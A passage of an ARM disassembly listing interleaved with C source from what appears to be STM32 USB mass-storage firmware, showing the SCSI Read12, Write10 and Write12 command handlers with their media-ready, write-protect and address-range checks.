 800a7a4:	d108      	bne.n	800a7b8 <SCSI_Read12+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a7a6:	7af9      	ldrb	r1, [r7, #11]
 800a7a8:	233a      	movs	r3, #58	; 0x3a
 800a7aa:	2202      	movs	r2, #2
 800a7ac:	68f8      	ldr	r0, [r7, #12]
 800a7ae:	f7ff fe25 	bl	800a3fc <SCSI_SenseCode>
      return -1;
 800a7b2:	f04f 33ff 	mov.w	r3, #4294967295
 800a7b6:	e07f      	b.n	800a8b8 <SCSI_Read12+0x17a>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a7b8:	68fb      	ldr	r3, [r7, #12]
 800a7ba:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a7be:	68fa      	ldr	r2, [r7, #12]
 800a7c0:	33b0      	adds	r3, #176	; 0xb0
 800a7c2:	009b      	lsls	r3, r3, #2
 800a7c4:	4413      	add	r3, r2
 800a7c6:	685b      	ldr	r3, [r3, #4]
 800a7c8:	689b      	ldr	r3, [r3, #8]
 800a7ca:	7afa      	ldrb	r2, [r7, #11]
 800a7cc:	4610      	mov	r0, r2
 800a7ce:	4798      	blx	r3
 800a7d0:	4603      	mov	r3, r0
 800a7d2:	2b00      	cmp	r3, #0
 800a7d4:	d008      	beq.n	800a7e8 <SCSI_Read12+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a7d6:	7af9      	ldrb	r1, [r7, #11]
 800a7d8:	233a      	movs	r3, #58	; 0x3a
 800a7da:	2202      	movs	r2, #2
 800a7dc:	68f8      	ldr	r0, [r7, #12]
 800a7de:	f7ff fe0d 	bl	800a3fc <SCSI_SenseCode>
      return -1;
 800a7e2:	f04f 33ff 	mov.w	r3, #4294967295
 800a7e6:	e067      	b.n	800a8b8 <SCSI_Read12+0x17a>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a7e8:	687b      	ldr	r3, [r7, #4]
 800a7ea:	3302      	adds	r3, #2
 800a7ec:	781b      	ldrb	r3, [r3, #0]
 800a7ee:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a7f0:	687b      	ldr	r3, [r7, #4]
 800a7f2:	3303      	adds	r3, #3
 800a7f4:	781b      	ldrb	r3, [r3, #0]
 800a7f6:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a7f8:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a7fa:	687b      	ldr	r3, [r7, #4]
 800a7fc:	3304      	adds	r3, #4
 800a7fe:	781b      	ldrb	r3, [r3, #0]
 800a800:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a802:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a804:	687a      	ldr	r2, [r7, #4]
 800a806:	3205      	adds	r2, #5
 800a808:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a80a:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a80c:	697a      	ldr	r2, [r7, #20]
 800a80e:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a812:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a814:	687b      	ldr	r3, [r7, #4]
 800a816:	3306      	adds	r3, #6
 800a818:	781b      	ldrb	r3, [r3, #0]
 800a81a:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800a81c:	687b      	ldr	r3, [r7, #4]
 800a81e:	3307      	adds	r3, #7
 800a820:	781b      	ldrb	r3, [r3, #0]
 800a822:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a824:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800a826:	687b      	ldr	r3, [r7, #4]
 800a828:	3308      	adds	r3, #8
 800a82a:	781b      	ldrb	r3, [r3, #0]
 800a82c:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800a82e:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800a830:	687a      	ldr	r2, [r7, #4]
 800a832:	3209      	adds	r2, #9
 800a834:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800a836:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a838:	697a      	ldr	r2, [r7, #20]
 800a83a:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a83e:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a840:	697b      	ldr	r3, [r7, #20]
 800a842:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a846:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a848:	697b      	ldr	r3, [r7, #20]
 800a84a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a84e:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a850:	7af9      	ldrb	r1, [r7, #11]
 800a852:	68f8      	ldr	r0, [r7, #12]
 800a854:	f000 fa4b 	bl	800acee <SCSI_CheckAddressRange>
 800a858:	4603      	mov	r3, r0
 800a85a:	2b00      	cmp	r3, #0
 800a85c:	da02      	bge.n	800a864 <SCSI_Read12+0x126>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a85e:	f04f 33ff 	mov.w	r3, #4294967295
 800a862:	e029      	b.n	800a8b8 <SCSI_Read12+0x17a>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a864:	697b      	ldr	r3, [r7, #20]
 800a866:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a86a:	699a      	ldr	r2, [r3, #24]
 800a86c:	697b      	ldr	r3, [r7, #20]
 800a86e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a872:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a874:	6979      	ldr	r1, [r7, #20]
 800a876:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a87a:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a87e:	fb01 f303 	mul.w	r3, r1, r3
 800a882:	429a      	cmp	r2, r3
 800a884:	d00b      	beq.n	800a89e <SCSI_Read12+0x160>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a886:	697b      	ldr	r3, [r7, #20]
 800a888:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a88c:	7f59      	ldrb	r1, [r3, #29]
 800a88e:	2320      	movs	r3, #32
 800a890:	2205      	movs	r2, #5
 800a892:	68f8      	ldr	r0, [r7, #12]
 800a894:	f7ff fdb2 	bl	800a3fc <SCSI_SenseCode>
      return -1;
 800a898:	f04f 33ff 	mov.w	r3, #4294967295
 800a89c:	e00c      	b.n	800a8b8 <SCSI_Read12+0x17a>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a89e:	697b      	ldr	r3, [r7, #20]
 800a8a0:	2202      	movs	r2, #2
 800a8a2:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a8a4:	697b      	ldr	r3, [r7, #20]
 800a8a6:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a8aa:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a8ac:	7afb      	ldrb	r3, [r7, #11]
 800a8ae:	4619      	mov	r1, r3
 800a8b0:	68f8      	ldr	r0, [r7, #12]
 800a8b2:	f000 fa49 	bl	800ad48 <SCSI_ProcessRead>
 800a8b6:	4603      	mov	r3, r0
}
 800a8b8:	4618      	mov	r0, r3
 800a8ba:	3718      	adds	r7, #24
 800a8bc:	46bd      	mov	sp, r7
 800a8be:	bd80      	pop	{r7, pc}

0800a8c0 <SCSI_Write10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a8c0:	b580      	push	{r7, lr}
 800a8c2:	b086      	sub	sp, #24
 800a8c4:	af00      	add	r7, sp, #0
 800a8c6:	60f8      	str	r0, [r7, #12]
 800a8c8:	460b      	mov	r3, r1
 800a8ca:	607a      	str	r2, [r7, #4]
 800a8cc:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a8ce:	68fb      	ldr	r3, [r7, #12]
 800a8d0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a8d4:	68fb      	ldr	r3, [r7, #12]
 800a8d6:	32b0      	adds	r2, #176	; 0xb0
 800a8d8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a8dc:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800a8de:	697b      	ldr	r3, [r7, #20]
 800a8e0:	2b00      	cmp	r3, #0
 800a8e2:	d102      	bne.n	800a8ea <SCSI_Write10+0x2a>
  {
    return -1;
 800a8e4:	f04f 33ff 	mov.w	r3, #4294967295
 800a8e8:	e0c7      	b.n	800aa7a <SCSI_Write10+0x1ba>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a8ea:	697b      	ldr	r3, [r7, #20]
 800a8ec:	7a1b      	ldrb	r3, [r3, #8]
 800a8ee:	2b00      	cmp	r3, #0
 800a8f0:	f040 80bd 	bne.w	800aa6e <SCSI_Write10+0x1ae>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800a8f4:	697b      	ldr	r3, [r7, #20]
 800a8f6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8fa:	699b      	ldr	r3, [r3, #24]
 800a8fc:	2b00      	cmp	r3, #0
 800a8fe:	d10b      	bne.n	800a918 <SCSI_Write10+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a900:	697b      	ldr	r3, [r7, #20]
 800a902:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a906:	7f59      	ldrb	r1, [r3, #29]
 800a908:	2320      	movs	r3, #32
 800a90a:	2205      	movs	r2, #5
 800a90c:	68f8      	ldr	r0, [r7, #12]
 800a90e:	f7ff fd75 	bl	800a3fc <SCSI_SenseCode>
      return -1;
 800a912:	f04f 33ff 	mov.w	r3, #4294967295
 800a916:	e0b0      	b.n	800aa7a <SCSI_Write10+0x1ba>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800a918:	697b      	ldr	r3, [r7, #20]
 800a91a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a91e:	7f1b      	ldrb	r3, [r3, #28]
 800a920:	b25b      	sxtb	r3, r3
 800a922:	2b00      	cmp	r3, #0
 800a924:	da0b      	bge.n	800a93e <SCSI_Write10+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a926:	697b      	ldr	r3, [r7, #20]
 800a928:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a92c:	7f59      	ldrb	r1, [r3, #29]
 800a92e:	2320      	movs	r3, #32
 800a930:	2205      	movs	r2, #5
 800a932:	68f8      	ldr	r0, [r7, #12]
 800a934:	f7ff fd62 	bl	800a3fc <SCSI_SenseCode>
      return -1;
 800a938:	f04f 33ff 	mov.w	r3, #4294967295
 800a93c:	e09d      	b.n	800aa7a <SCSI_Write10+0x1ba>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a93e:	68fb      	ldr	r3, [r7, #12]
 800a940:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a944:	68fa      	ldr	r2, [r7, #12]
 800a946:	33b0      	adds	r3, #176	; 0xb0
 800a948:	009b      	lsls	r3, r3, #2
 800a94a:	4413      	add	r3, r2
 800a94c:	685b      	ldr	r3, [r3, #4]
 800a94e:	689b      	ldr	r3, [r3, #8]
 800a950:	7afa      	ldrb	r2, [r7, #11]
 800a952:	4610      	mov	r0, r2
 800a954:	4798      	blx	r3
 800a956:	4603      	mov	r3, r0
 800a958:	2b00      	cmp	r3, #0
 800a95a:	d008      	beq.n	800a96e <SCSI_Write10+0xae>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a95c:	7af9      	ldrb	r1, [r7, #11]
 800a95e:	233a      	movs	r3, #58	; 0x3a
 800a960:	2202      	movs	r2, #2
 800a962:	68f8      	ldr	r0, [r7, #12]
 800a964:	f7ff fd4a 	bl	800a3fc <SCSI_SenseCode>
      return -1;
 800a968:	f04f 33ff 	mov.w	r3, #4294967295
 800a96c:	e085      	b.n	800aa7a <SCSI_Write10+0x1ba>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800a96e:	68fb      	ldr	r3, [r7, #12]
 800a970:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a974:	68fa      	ldr	r2, [r7, #12]
 800a976:	33b0      	adds	r3, #176	; 0xb0
 800a978:	009b      	lsls	r3, r3, #2
 800a97a:	4413      	add	r3, r2
 800a97c:	685b      	ldr	r3, [r3, #4]
 800a97e:	68db      	ldr	r3, [r3, #12]
 800a980:	7afa      	ldrb	r2, [r7, #11]
 800a982:	4610      	mov	r0, r2
 800a984:	4798      	blx	r3
 800a986:	4603      	mov	r3, r0
 800a988:	2b00      	cmp	r3, #0
 800a98a:	d008      	beq.n	800a99e <SCSI_Write10+0xde>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800a98c:	7af9      	ldrb	r1, [r7, #11]
 800a98e:	2327      	movs	r3, #39	; 0x27
 800a990:	2202      	movs	r2, #2
 800a992:	68f8      	ldr	r0, [r7, #12]
 800a994:	f7ff fd32 	bl	800a3fc <SCSI_SenseCode>
      return -1;
 800a998:	f04f 33ff 	mov.w	r3, #4294967295
 800a99c:	e06d      	b.n	800aa7a <SCSI_Write10+0x1ba>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a99e:	687b      	ldr	r3, [r7, #4]
 800a9a0:	3302      	adds	r3, #2
 800a9a2:	781b      	ldrb	r3, [r3, #0]
 800a9a4:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a9a6:	687b      	ldr	r3, [r7, #4]
 800a9a8:	3303      	adds	r3, #3
 800a9aa:	781b      	ldrb	r3, [r3, #0]
 800a9ac:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a9ae:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800a9b0:	687b      	ldr	r3, [r7, #4]
 800a9b2:	3304      	adds	r3, #4
 800a9b4:	781b      	ldrb	r3, [r3, #0]
 800a9b6:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a9b8:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a9ba:	687a      	ldr	r2, [r7, #4]
 800a9bc:	3205      	adds	r2, #5
 800a9be:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800a9c0:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a9c2:	697a      	ldr	r2, [r7, #20]
 800a9c4:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a9c8:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800a9ca:	687b      	ldr	r3, [r7, #4]
 800a9cc:	3307      	adds	r3, #7
 800a9ce:	781b      	ldrb	r3, [r3, #0]
 800a9d0:	021b      	lsls	r3, r3, #8
                         (uint32_t)params[8];
 800a9d2:	687a      	ldr	r2, [r7, #4]
 800a9d4:	3208      	adds	r2, #8
 800a9d6:	7812      	ldrb	r2, [r2, #0]
    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800a9d8:	4313      	orrs	r3, r2
 800a9da:	697a      	ldr	r2, [r7, #20]
 800a9dc:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a9e0:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a9e2:	697b      	ldr	r3, [r7, #20]
 800a9e4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a9e8:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a9ea:	697b      	ldr	r3, [r7, #20]
 800a9ec:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a9f0:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a9f2:	7af9      	ldrb	r1, [r7, #11]
 800a9f4:	68f8      	ldr	r0, [r7, #12]
 800a9f6:	f000 f97a 	bl	800acee <SCSI_CheckAddressRange>
 800a9fa:	4603      	mov	r3, r0
 800a9fc:	2b00      	cmp	r3, #0
 800a9fe:	da02      	bge.n	800aa06 <SCSI_Write10+0x146>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800aa00:	f04f 33ff 	mov.w	r3, #4294967295
 800aa04:	e039      	b.n	800aa7a <SCSI_Write10+0x1ba>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800aa06:	697b      	ldr	r3, [r7, #20]
 800aa08:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa0c:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aa0e:	697a      	ldr	r2, [r7, #20]
 800aa10:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aa14:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800aa18:	fb02 f303 	mul.w	r3, r2, r3
 800aa1c:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800aa1e:	697b      	ldr	r3, [r7, #20]
 800aa20:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa24:	699b      	ldr	r3, [r3, #24]
 800aa26:	693a      	ldr	r2, [r7, #16]
 800aa28:	429a      	cmp	r2, r3
 800aa2a:	d00b      	beq.n	800aa44 <SCSI_Write10+0x184>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800aa2c:	697b      	ldr	r3, [r7, #20]
 800aa2e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa32:	7f59      	ldrb	r1, [r3, #29]
 800aa34:	2320      	movs	r3, #32
 800aa36:	2205      	movs	r2, #5
 800aa38:	68f8      	ldr	r0, [r7, #12]
 800aa3a:	f7ff fcdf 	bl	800a3fc <SCSI_SenseCode>
      return -1;
 800aa3e:	f04f 33ff 	mov.w	r3, #4294967295
 800aa42:	e01a      	b.n	800aa7a <SCSI_Write10+0x1ba>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800aa44:	693b      	ldr	r3, [r7, #16]
 800aa46:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800aa4a:	bf28      	it	cs
 800aa4c:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800aa50:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800aa52:	697b      	ldr	r3, [r7, #20]
 800aa54:	2201      	movs	r2, #1
 800aa56:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800aa58:	4b0a      	ldr	r3, [pc, #40]	; (800aa84 <SCSI_Write10+0x1c4>)
 800aa5a:	7819      	ldrb	r1, [r3, #0]
 800aa5c:	697b      	ldr	r3, [r7, #20]
 800aa5e:	f103 0210 	add.w	r2, r3, #16
 800aa62:	693b      	ldr	r3, [r7, #16]
 800aa64:	68f8      	ldr	r0, [r7, #12]
 800aa66:	f002 faf3 	bl	800d050 <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800aa6a:	2300      	movs	r3, #0
 800aa6c:	e005      	b.n	800aa7a <SCSI_Write10+0x1ba>
    return SCSI_ProcessWrite(pdev, lun);
 800aa6e:	7afb      	ldrb	r3, [r7, #11]
 800aa70:	4619      	mov	r1, r3
 800aa72:	68f8      	ldr	r0, [r7, #12]
 800aa74:	f000 f9fe 	bl	800ae74 <SCSI_ProcessWrite>
 800aa78:	4603      	mov	r3, r0
}
 800aa7a:	4618      	mov	r0, r3
 800aa7c:	3718      	adds	r7, #24
 800aa7e:	46bd      	mov	sp, r7
 800aa80:	bd80      	pop	{r7, pc}
 800aa82:	bf00      	nop
 800aa84:	2000010b 	.word	0x2000010b

0800aa88 <SCSI_Write12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800aa88:	b580      	push	{r7, lr}
 800aa8a:	b086      	sub	sp, #24
 800aa8c:	af00      	add	r7, sp, #0
 800aa8e:	60f8      	str	r0, [r7, #12]
 800aa90:	460b      	mov	r3, r1
 800aa92:	607a      	str	r2, [r7, #4]
 800aa94:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800aa96:	68fb      	ldr	r3, [r7, #12]
 800aa98:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800aa9c:	68fb      	ldr	r3, [r7, #12]
 800aa9e:	32b0      	adds	r2, #176	; 0xb0
 800aaa0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800aaa4:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800aaa6:	697b      	ldr	r3, [r7, #20]
 800aaa8:	2b00      	cmp	r3, #0
 800aaaa:	d102      	bne.n	800aab2 <SCSI_Write12+0x2a>
  {
    return -1;
 800aaac:	f04f 33ff 	mov.w	r3, #4294967295
 800aab0:	e0d7      	b.n	800ac62 <SCSI_Write12+0x1da>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800aab2:	697b      	ldr	r3, [r7, #20]
 800aab4:	7a1b      	ldrb	r3, [r3, #8]
 800aab6:	2b00      	cmp	r3, #0
 800aab8:	f040 80cd 	bne.w	800ac56 <SCSI_Write12+0x1ce>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800aabc:	697b      	ldr	r3, [r7, #20]
 800aabe:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aac2:	699b      	ldr	r3, [r3, #24]
 800aac4:	2b00      	cmp	r3, #0
 800aac6:	d10b      	bne.n	800aae0 <SCSI_Write12+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800aac8:	697b      	ldr	r3, [r7, #20]
 800aaca:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aace:	7f59      	ldrb	r1, [r3, #29]
 800aad0:	2320      	movs	r3, #32
 800aad2:	2205      	movs	r2, #5
 800aad4:	68f8      	ldr	r0, [r7, #12]
 800aad6:	f7ff fc91 	bl	800a3fc <SCSI_SenseCode>
      return -1;
 800aada:	f04f 33ff 	mov.w	r3, #4294967295
 800aade:	e0c0      	b.n	800ac62 <SCSI_Write12+0x1da>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800aae0:	697b      	ldr	r3, [r7, #20]
 800aae2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aae6:	7f1b      	ldrb	r3, [r3, #28]
 800aae8:	b25b      	sxtb	r3, r3
 800aaea:	2b00      	cmp	r3, #0
 800aaec:	da0b      	bge.n	800ab06 <SCSI_Write12+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800aaee:	697b      	ldr	r3, [r7, #20]
 800aaf0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aaf4:	7f59      	ldrb	r1, [r3, #29]
 800aaf6:	2320      	movs	r3, #32
 800aaf8:	2205      	movs	r2, #5
 800aafa:	68f8      	ldr	r0, [r7, #12]
 800aafc:	f7ff fc7e 	bl	800a3fc <SCSI_SenseCode>
      return -1;
 800ab00:	f04f 33ff 	mov.w	r3, #4294967295
 800ab04:	e0ad      	b.n	800ac62 <SCSI_Write12+0x1da>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800ab06:	68fb      	ldr	r3, [r7, #12]
 800ab08:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800ab0c:	68fa      	ldr	r2, [r7, #12]
 800ab0e:	33b0      	adds	r3, #176	; 0xb0
 800ab10:	009b      	lsls	r3, r3, #2
 800ab12:	4413      	add	r3, r2
 800ab14:	685b      	ldr	r3, [r3, #4]
 800ab16:	689b      	ldr	r3, [r3, #8]
 800ab18:	7afa      	ldrb	r2, [r7, #11]
 800ab1a:	4610      	mov	r0, r2
 800ab1c:	4798      	blx	r3
 800ab1e:	4603      	mov	r3, r0
 800ab20:	2b00      	cmp	r3, #0
 800ab22:	d00b      	beq.n	800ab3c <SCSI_Write12+0xb4>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800ab24:	7af9      	ldrb	r1, [r7, #11]
 800ab26:	233a      	movs	r3, #58	; 0x3a
 800ab28:	2202      	movs	r2, #2
 800ab2a:	68f8      	ldr	r0, [r7, #12]
 800ab2c:	f7ff fc66 	bl	800a3fc <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800ab30:	697b      	ldr	r3, [r7, #20]
 800ab32:	2205      	movs	r2, #5
 800ab34:	721a      	strb	r2, [r3, #8]
      return -1;
 800ab36:	f04f 33ff 	mov.w	r3, #4294967295
 800ab3a:	e092      	b.n	800ac62 <SCSI_Write12+0x1da>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800ab3c:	68fb      	ldr	r3, [r7, #12]
 800ab3e:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800ab42:	68fa      	ldr	r2, [r7, #12]
 800ab44:	33b0      	adds	r3, #176	; 0xb0
 800ab46:	009b      	lsls	r3, r3, #2
 800ab48:	4413      	add	r3, r2
 800ab4a:	685b      	ldr	r3, [r3, #4]
 800ab4c:	68db      	ldr	r3, [r3, #12]
 800ab4e:	7afa      	ldrb	r2, [r7, #11]
 800ab50:	4610      	mov	r0, r2
 800ab52:	4798      	blx	r3
 800ab54:	4603      	mov	r3, r0
 800ab56:	2b00      	cmp	r3, #0
 800ab58:	d00b      	beq.n	800ab72 <SCSI_Write12+0xea>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800ab5a:	7af9      	ldrb	r1, [r7, #11]
 800ab5c:	2327      	movs	r3, #39	; 0x27
 800ab5e:	2202      	movs	r2, #2
 800ab60:	68f8      	ldr	r0, [r7, #12]
 800ab62:	f7ff fc4b 	bl	800a3fc <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800ab66:	697b      	ldr	r3, [r7, #20]
 800ab68:	2205      	movs	r2, #5
 800ab6a:	721a      	strb	r2, [r3, #8]
      return -1;
 800ab6c:	f04f 33ff 	mov.w	r3, #4294967295
 800ab70:	e077      	b.n	800ac62 <SCSI_Write12+0x1da>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800ab72:	687b      	ldr	r3, [r7, #4]
 800ab74:	3302      	adds	r3, #2
 800ab76:	781b      	ldrb	r3, [r3, #0]
 800ab78:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800ab7a:	687b      	ldr	r3, [r7, #4]
 800ab7c:	3303      	adds	r3, #3
 800ab7e:	781b      	ldrb	r3, [r3, #0]
 800ab80:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800ab82:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800ab84:	687b      	ldr	r3, [r7, #4]
 800ab86:	3304      	adds	r3, #4
